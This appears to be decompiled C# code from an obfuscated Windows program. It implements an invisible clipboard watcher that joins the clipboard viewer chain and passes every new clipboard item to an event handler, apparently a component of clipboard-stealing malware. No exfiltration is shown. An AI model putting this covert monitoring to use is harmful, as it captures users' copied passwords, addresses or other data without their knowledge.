using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Dodjins
{
	// Token: 0x02000014 RID: 20
	public static class clripwmai2
	{
		// Token: 0x14000001 RID: 1
		// (add) Token: 0x06000073 RID: 115 RVA: 0x00003EAC File Offset: 0x000020AC
		// (remove) Token: 0x06000074 RID: 116 RVA: 0x00003EE0 File Offset: 0x000020E0
		public static event clripwmai2.OnClipboardChangeEventHandler OnClipboardChange;

		// Token: 0x06000075 RID: 117 RVA: 0x00003F13 File Offset: 0x00002113
		public static void Start()
		{
			clripwmai2.ClipboardWatcher.Start();
			clripwmai2.ClipboardWatcher.OnClipboardChange += delegate(fornau2 format, object data)
			{
				clripwmai2.OnClipboardChangeEventHandler onClipboardChange = clripwmai2.OnClipboardChange;
				if (onClipboardChange != null)
				{
					onClipboardChange(format, data);
				}
			};
		}

		// Token: 0x06000076 RID: 118 RVA: 0x00003F41 File Offset: 0x00002141
		public static void Stop()
		{
			clripwmai2.OnClipboardChange = null;
			clripwmai2.ClipboardWatcher.Stop();
		}

		// Token: 0x02000015 RID: 21
		// (Invoke) Token: 0x06000078 RID: 120
		public delegate void OnClipboardChangeEventHandler(fornau2 format, object data);

		// Token: 0x02000016 RID: 22
		private class ClipboardWatcher : Form
		{
			// Token: 0x14000002 RID: 2
			// (add) Token: 0x0600007B RID: 123 RVA: 0x00003F50 File Offset: 0x00002150
			// (remove) Token: 0x0600007C RID: 124 RVA: 0x00003F84 File Offset: 0x00002184
			public static event clripwmai2.ClipboardWatcher.OnClipboardChangeEventHandler OnClipboardChange;

			// Token: 0x0600007D RID: 125 RVA: 0x00003FB8 File Offset: 0x000021B8
			public static void Start()
			{
				bool flag = clripwmai2.ClipboardWatcher.mInstance != null;
				if (!flag)
				{
					Thread thread = new Thread(delegate(object x)
					{
						Application.Run(new clripwmai2.ClipboardWatcher());
					});
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
				}
			}

			// Token: 0x0600007E RID: 126 RVA: 0x00004008 File Offset: 0x00002208
			public static void Stop()
			{
				clripwmai2.ClipboardWatcher.mInstance.Invoke(new MethodInvoker(delegate
				{
					clripwmai2.ClipboardWatcher.ChangeClipboardChain(clripwmai2.ClipboardWatcher.mInstance.Handle, clripwmai2.ClipboardWatcher.nextClipboardViewer);
				}));
				clripwmai2.ClipboardWatcher.mInstance.Invoke(new MethodInvoker(clripwmai2.ClipboardWatcher.mInstance.Close));
				clripwmai2.ClipboardWatcher.mInstance.Dispose();
				clripwmai2.ClipboardWatcher.mInstance = null;
			}

			// Token: 0x0600007F RID: 127 RVA: 0x0000406C File Offset: 0x0000226C
			protected override void SetVisibleCore(bool value)
			{
				this.CreateHandle();
				clripwmai2.ClipboardWatcher.mInstance = this;
				clripwmai2.ClipboardWatcher.nextClipboardViewer = clripwmai2.ClipboardWatcher.SetClipboardViewer(clripwmai2.ClipboardWatcher.mInstance.Handle);
				base.SetVisibleCore(false);
			}

			// Token: 0x06000080 RID: 128
			[DllImport("User32.dll", CharSet = CharSet.Auto)]
			private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);

			// Token: 0x06000081 RID: 129
			[DllImport("User32.dll", CharSet = CharSet.Auto)]
			private static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

			// Token: 0x06000082 RID: 130
			[DllImport("user32.dll", CharSet = CharSet.Auto)]
			private static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

			// Token: 0x06000083 RID: 131 RVA: 0x00004098 File Offset: 0x00002298
			protected override void WndProc(ref Message m)
			{
				int msg = m.Msg;
				if (msg != 776)
				{
					if (msg != 781)
					{
						base.WndProc(ref m);
					}
					else
					{
						bool flag = m.WParam == clripwmai2.ClipboardWatcher.nextClipboardViewer;
						if (flag)
						{
							clripwmai2.ClipboardWatcher.nextClipboardViewer = m.LParam;
						}
						else
						{
							clripwmai2.ClipboardWatcher.SendMessage(clripwmai2.ClipboardWatcher.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
						}
					}
				}
				else
				{
					this.ClipChanged();
					clripwmai2.ClipboardWatcher.SendMessage(clripwmai2.ClipboardWatcher.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
				}
			}

			// Token: 0x06000084 RID: 132 RVA: 0x00004134 File Offset: 0x00002334
			private void ClipChanged()
			{
				IDataObject dataObject = Clipboard.GetDataObject();
				fornau2? fornau = null;
				foreach (string text in clripwmai2.ClipboardWatcher.formats)
				{
					bool dataPresent = dataObject.GetDataPresent(text);
					if (dataPresent)
					{
						fornau = new fornau2?((fornau2)Enum.Parse(typeof(fornau2), text));
						break;
					}
				}
				object data = dataObject.GetData(fornau.ToString());
				bool flag = data == null || fornau == null;
				if (!flag)
				{
					bool flag2 = clripwmai2.ClipboardWatcher.OnClipboardChange != null;
					if (flag2)
					{
						clripwmai2.ClipboardWatcher.OnClipboardChange(fornau.Value, data);
					}
				}
			}

			// Token: 0x04000037 RID: 55
			private static clripwmai2.ClipboardWatcher mInstance;

			// Token: 0x04000038 RID: 56
			private static IntPtr nextClipboardViewer;

			// Token: 0x0400003A RID: 58
			private const int WM_DRAWCLIPBOARD = 776;

			// Token: 0x0400003B RID: 59
			private const int WM_CHANGECBCHAIN = 781;

			// Token: 0x0400003C RID: 60
			private static readonly string[] formats = Enum.GetNames(typeof(fornau2));

			// Token: 0x02000017 RID: 23
			// (Invoke) Token: 0x06000088 RID: 136
			public delegate void OnClipboardChangeEventHandler(fornau2 format, object data);
		}
	}
}
